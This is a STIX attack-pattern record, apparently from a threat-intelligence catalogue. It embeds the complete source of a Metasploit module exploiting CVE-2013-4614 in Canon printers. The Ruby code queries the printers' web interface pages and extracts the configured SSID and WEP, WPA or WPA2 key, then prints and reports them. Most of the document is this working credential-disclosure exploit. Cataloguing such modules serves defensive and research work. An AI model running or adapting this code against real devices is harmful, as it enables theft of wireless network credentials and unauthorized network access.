{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1da68ca1-de6d-42d2-8e5f-a04105ec1617",
    "created": "2024-08-14T16:29:57.521776Z",
    "modified": "2024-08-14T16:29:57.52178Z",
    "name": "Canon Printer Wireless Configuration Disclosure",
    "description": " This module enumerates wireless credentials from Canon printers with a web interface. It has been tested on Canon models: MG3100, MG5300, MG6100, MP495, MX340, MX870 MX890, MX920.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/canon_wireless.rb",
            "external_id": "canon_wireless.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4614"
        },
        {
            "source_name": "reference",
            "url": "https://www.mattandreko.com/2013/06/canon-y-u-no-security.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Canon Printer Wireless Configuration Disclosure',\n      'Description'    => %q{\n          This module enumerates wireless credentials from Canon printers with a web interface.\n          It has been tested on Canon models: MG3100, MG5300, MG6100, MP495, MX340, MX870,\n          MX890, MX920.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Matt \"hostess\" Andreko <mandreko[at]accuvant.com>'\n        ],\n      'References'     => [\n        [ 'CVE', '2013-4614' ],\n        [ 'OSVDB', '94417' ],\n        [ 'URL', 'https://www.mattandreko.com/2013/06/canon-y-u-no-security.html']\n      ],\n      'DisclosureDate' => '2013-06-18'))\n  end\n\n  def get_network_settings\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => '/English/pages_MacUS/lan_set_content.html',\n      })\n    rescue\n      print_error(\"#{rhost}:#{rport} Could not connect.\")\n      return\n    end\n\n    if res\n      if res.code == 200\n\n        html = Nokogiri::HTML(res.body)\n\n        checked_lan_setting = html.xpath '//input[@name=\"LAN_OPT1\" and @checked]'\n\n        if checked_lan_setting.count == 1\n          lan_setting = ''\n          ssid = ''\n          case checked_lan_setting[0]['value']\n          when '0'\n            lan_setting = 'Do not use LAN'\n          when '1'\n            lan_setting = 'Use wired LAN'\n          when '2'\n            lan_setting = 'Use wireless LAN'\n\n            ssid_input = html.xpath '//input[@name=\"LAN_TXT1\"]'\n            ssid = ssid_input[0]['value'] if ssid_input.count == 1\n          end\n\n          return lan_setting, ssid\n        else\n          print_error(\"#{rhost}:#{rport} Could not determine LAN Settings.\")\n        end\n\n      elsif res.code == 401\n        print_error(\"#{rhost}:#{rport} Authentication failed\")\n      elsif res.code == 404\n        print_error(\"#{rhost}:#{rport} File not found\")\n      end\n    end\n  end\n\n  def get_wireless_key\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => \"/English/pages_MacUS/wls_set_content.html\",\n      })\n    rescue\n      print_error(\"#{ip}:#{rport} Could not connect.\")\n      return\n    end\n\n    if res\n      if res.code == 200\n        html = Nokogiri::HTML(res.body)\n        encryption_setting = ''\n        encryption_key = ''\n\n        checked_encryption_setting = html.xpath '//input[@name=\"WLS_OPT1\" and @checked]'\n        case checked_encryption_setting[0]['value']\n        when '0'\n          encryption_setting = 'None'\n        when '1'\n          encryption_setting = 'WEP'\n          wep_key_inputs = html.xpath '//input[starts-with(@name, \"WLS_TXT1\") and not(@value=\"\")]'\n          encryption_key = wep_key_inputs.collect{|x| x['value']}.join(', ')\n        when '2'\n          encryption_setting = 'WPA'\n          wpa_key_input = html.xpath '//input[@name=\"WLS_TXT2\"]'\n          encryption_key = wpa_key_input[0]['value']\n        when '3'\n          encryption_setting = 'WPA2'\n          wpa2_key_input = html.xpath '//input[@name=\"WLS_TXT3\"]'\n          encryption_key = wpa2_key_input[0]['value']\n        end\n\n        return encryption_setting, encryption_key\n\n      elsif res.code == 401\n        print_error(\"#{rhost}:#{rport} Authentication failed\")\n      elsif res.code == 404\n        print_error(\"#{rhost}:#{rport} File not found\")\n      end\n    end\n  end\n\n  def run_host(ip)\n\n    ns = get_network_settings\n    return if ns.nil?\n\n    good_string = \"#{rhost}:#{rport} Option: #{ns[0]}\"\n    if ns[0] == 'Use wireless LAN'\n      wireless_key = get_wireless_key\n      good_string += \"\\tSSID: #{ns[1]}\\tEncryption Type: #{wireless_key[0]}\\tKey: #{wireless_key[1]}\"\n    end\n\n    report_note({\n      :data => good_string,\n      :type => 'canon.wireless',\n      :host => ip,\n      :port => rport\n    })\n\n    print_good good_string\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-18"
}